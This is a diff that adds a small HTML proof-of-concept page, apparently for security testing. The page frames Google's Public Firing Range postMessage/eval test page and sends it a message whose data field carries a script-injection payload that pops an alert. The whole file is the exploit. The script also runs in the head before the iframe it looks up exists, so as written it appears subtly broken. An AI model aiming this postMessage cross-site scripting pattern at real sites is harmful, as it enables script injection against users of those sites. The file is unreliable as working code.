@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html> 
+ <head>
+   <script>
+var target = document.getElementById('target')
+
+target.addEventListener('load', () => {
+
+target.contentWindow.postMessage({
+    "type": "redacted",
+    "data": "<script>alert(document.domain)</script>"}, '*')
+})
+target.src = "https://public-firing-range.appspot.com/dom/toxicdom/postMessage/eval"
+   </script>
+ <meta charset="utf-8">    
+ <meta name="viewport" content="width=device-width">   
+  </head>
+    <body>  
+       <iframe id=target></iframe>  
+    </body>
+</html>
